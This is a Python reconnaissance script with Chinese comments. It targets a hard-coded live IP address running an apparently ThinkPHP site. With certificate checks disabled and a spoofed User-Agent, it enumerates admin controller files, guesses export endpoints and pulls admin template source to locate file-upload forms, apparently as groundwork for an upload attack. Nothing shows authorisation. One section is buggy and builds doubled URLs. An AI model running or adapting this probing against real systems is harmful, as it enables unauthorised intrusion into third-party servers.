#!/usr/bin/env python3
"""tp_deep3.py - 深挖上传接口+Video控制器+Export方法"""
import urllib.request, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
BASE = "https://139.196.199.221"

def get(path):
    try:
        r = urllib.request.urlopen(urllib.request.Request(BASE + path, headers=UA), timeout=8, context=ctx)
        return r.status, r.read(120000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(120000).decode("utf-8", "ignore")
    except Exception:
        return 0, ""

def exists(path):
    st, b = get(path)
    return st == 200 and len(b) > 50

print("=== 1. 枚举更多控制器 ===", flush=True)
for c in ["Video", "Upload", "File", "Img", "Pic", "Image", "Picture", "Media",
          "Attach", "Attachment", "Files", "Upfile", "UploadFile", "UploadImg",
          "Ajax", "Common", "Public", "Index2", "Main", "Home", "Api", "Data",
          "Excel", "Csv", "Import", "Export2", "Down", "Download", "Zip"]:
    if exists("/application/admin/controller/%s.php" % c):
        print("  FOUND controller: %s" % c, flush=True)

print("=== 2. Export控制器方法(从模板url()找) ===", flush=True)
for m in ["goodslist", "orderlist", "userlist", "productlist", "index", "list",
          "export", "excel", "csv", "all", "data"]:
    st, b = get(BASE + "/admin/export/%s.html" % m)
    print("  export/%s -> st=%d size=%d" % (m, st, len(b)), flush=True)

print("=== 3. 读goods/edit.html找上传表单(23KB大模板) ===", flush=True)
st, b = get("/application/admin/view/goods/edit.html")
if st == 200:
    # 找upload相关代码
    for m in re.finditer(r'.{0,80}(?:upload|Upload|uploadFile|layui-upload|img_url|pic_url|fileInput).{0,120}', b):
        s = m.group(0).replace("\n", " ").strip()
        print("  UPLOAD-REF: %s" % s[:220], flush=True)
    print("---", flush=True)
    # 所有url: 引用
    for m in re.finditer(r'url\s*[:=]\s*["\']([^"\']+)["\']', b):
        print("  URL: %s" % m.group(1), flush=True)

print("=== 4. banner/index.html 上传引用 ===", flush=True)
st, b = get("/application/admin/view/banner/index.html")
if st == 200:
    for m in re.finditer(r'.{0,60}(?:upload|Upload|img_url|img|src=).{0,100}', b):
        s = m.group(0).replace("\n", " ").strip()
        print("  REF: %s" % s[:180], flush=True)

print("=== DONE ===", flush=True)
